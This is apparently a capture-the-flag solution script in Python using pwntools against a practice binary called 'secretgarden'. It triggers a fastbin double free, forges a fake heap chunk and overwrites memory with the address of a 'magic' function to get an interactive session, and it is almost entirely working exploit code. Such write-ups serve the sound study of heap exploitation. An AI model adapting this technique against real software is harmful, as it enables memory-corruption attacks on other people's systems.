#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io, "b *0x4009F2")

def Raise(length, name):
    io.sendlineafter(" : ", "1")
    io.sendlineafter(" :", str(length))
    io.sendafter(" :", name)
    io.sendlineafter(" :", "nb")

def remove(idx):
    io.sendlineafter(" : ", "3")
    io.sendlineafter(":", str(idx))

if __name__ == "__main__":
    #  io = process("./secretgarden", {"LD_PRELOAD": "./libc-2.23.so"})
    io = process("./secretgarden")

    Raise(0x50, "000") # 0
    Raise(0x50, "111") # 1

    remove(0) # 0
    #  pause()
    remove(1) # 1 -> 0
    remove(0) # 0 -> 1 -> 0

    magic = ELF("./secretgarden").sym["magic"]
    #  fakeChunk = 0x602028 + 2 - 8
    fakeChunk = 0x602000+2-8

    Raise(0x50, p64(fakeChunk)) # 0
    Raise(0x50, "111") # 1
    Raise(0x50, "000")
    #  DEBUG()
    #  payload = cyclic(8 - 2) + p64(magic) * 8
    payload = cyclic(8 + 8 - 2) + p64(magic) * 2
    Raise(0x50, payload)

    io.interactive()
    io.close()
